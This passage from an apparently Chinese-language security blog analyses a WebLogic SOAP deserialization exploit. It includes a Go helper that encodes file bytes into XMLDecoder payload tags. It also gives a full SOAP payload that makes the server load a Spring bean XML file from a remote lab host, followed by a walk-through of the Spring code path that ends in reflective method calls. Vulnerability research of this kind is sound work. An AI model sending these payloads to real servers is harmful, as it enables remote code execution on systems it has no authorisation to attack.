length=\"%d\"&gt;"</span>, len(fileContentsBytes))</span><br><span class="line">	<span class="keyword">for</span> i, b := range fileContentsBytes &#123;</span><br><span class="line">		sIndex := fmt.Sprintf(<span class="string">"&lt;void index=\"%d\"&gt;&lt;byte&gt;%d&lt;/byte&gt;&lt;/void&gt;"</span>, i, int8(b))</span><br><span class="line">		result = result + sIndex</span><br><span class="line">	&#125;</span><br><span class="line">	result = result + <span class="string">"&lt;/array&gt;"</span></span><br><span class="line">	fmt.Println(result)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里 golang 的 byte 是 uint8，java 是 int8，需要进行转换。然后将得到的<code>&lt;array&gt;</code>标签内容添加到 POC2 中。</p>
<h3 id="POC2-FileSystemXmlApplicationContext"><a href="#POC2-FileSystemXmlApplicationContext" class="headerlink" title="POC2-FileSystemXmlApplicationContext"></a>POC2-FileSystemXmlApplicationContext</h3><p>参考来源同上。<br>为了大致搞清楚这个类的利用流程，需要了解 spring bean 的大致逻辑。在 github 上寻找了一个 spring bean 核心部分<a href="https://github.com/greyireland/tiny-spring" target="_blank" rel="noopener">简化版</a>，能让我大致搞明白基本流程。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;soapenv:Envelope xmlns:soapenv=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span></span><br><span class="line">    xmlns:wsa=<span class="string">"http://www.w3.org/2005/08/addressing"</span> xmlns:balisong=<span class="string">"http://www.bea.com/async/AsyncResponseService"</span>&gt;</span><br><span class="line">    &lt;soapenv:Header&gt;</span><br><span class="line">        &lt;wsa:Action&gt;test&lt;/wsa:Action&gt;</span><br><span class="line">        &lt;wsa:RelatesTo&gt;test&lt;/wsa:RelatesTo&gt;</span><br><span class="line">        &lt;work:WorkContext xmlns:work=<span class="string">"http://bea.com/2004/06/soap/workarea/"</span>&gt;</span><br><span class="line">            &lt;class&gt;com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext&lt;void&gt;&lt;string&gt;http://172.16.170.1:8000/test.xml&lt;/string&gt;&lt;/void&gt;</span><br><span class="line">            &lt;/class&gt;</span><br><span class="line">        &lt;/work:WorkContext&gt;</span><br><span class="line">    &lt;/soapenv:Header&gt;</span><br><span class="line">    &lt;soapenv:Body&gt;</span><br><span class="line">        &lt;balisong:onAsyncDelivery&gt;calculator&lt;/balisong:onAsyncDelivery&gt;</span><br><span class="line">    &lt;/soapenv:Body&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure>

<p>这里利用 FileSystemXmlApplicationContext 的构造函数，传递了一个 http 地址。<br>通过调试知道在获取 Resource 的时候，FileSystemXmlApplication 会调用 DefaultResourceLoader.getResource</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Resource <span class="title">getResource</span><span class="params">(String location)</span> </span>&#123;</span><br><span class="line">        Assert.notNull(location, <span class="string">"Location must not be null"</span>);</span><br><span class="line">        <span class="keyword">if</span> (location.startsWith(<span class="string">"classpath:"</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> ClassPathResource(location.substring(<span class="string">"classpath:"</span>.length()), <span class="keyword">this</span>.getClassLoader());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                URL url = <span class="keyword">new</span> URL(location);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> UrlResource(url);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (MalformedURLException var3) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">this</span>.getResourceByPath(location);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>location 如果是一个合法 URL，则直接返回一个 URLResource，后续会调用 getInputStream 去获取内容。因为没有一个判断标准，所以这里好像是没法用于 GET 型的 SSRF 的。如果是文件相对地址的话，会返回一个 FileResource。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//URLRESOURCE</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> InputStream <span class="title">getInputStream</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        URLConnection con = <span class="keyword">this</span>.url.openConnection();</span><br><span class="line">        con.setUseCaches(<span class="keyword">false</span>);</span><br><span class="line">        <span class="keyword">return</span> con.getInputStream();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//FILERESOURCE</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> InputStream <span class="title">getInputStream</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> FileInputStream(<span class="keyword">this</span>.file);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>后面的工作就是解析 XML 文件返回 bean 对象。<br>因为 bean 提供一个 init-method 属性，他表现在 BeanDefinition 的 initMethodName 属性中，如果存在此属性，则会在导出对象时，通过反射进行调用。<br>虽然还有一个 destroyMethodName 属性，后续也可以利用来进行反射，但是需要 FileSystemXmlApplication 在执行 close 方法后才会进行反射调用，在构造函数中肯定是不会调用 close 的。</p>
</div></article></div></main><footer><div class="paginator"><a class="next" href="/2018/11/25/Code-Breaking-JS/">next</a></div><div class="copyright"><p>&copy; 2019 - 2020 <a href="https://blog.l0ca1.xyz" target="_blank" rel="noopener">l0ca1</a><br>Powered by <a href="https://hexo.io/" rel="noreferrer" target="_blank">Hexo</a></p></div></footer></div></div><script src="https://cdnjs.cloudflare.com/ajax/libs/barba.js/1.0.0/barba.min.js"></script><script>document.addEventListener('DOMContentLoaded', function() {
    Barba.Pjax.start()
})</script></body></html>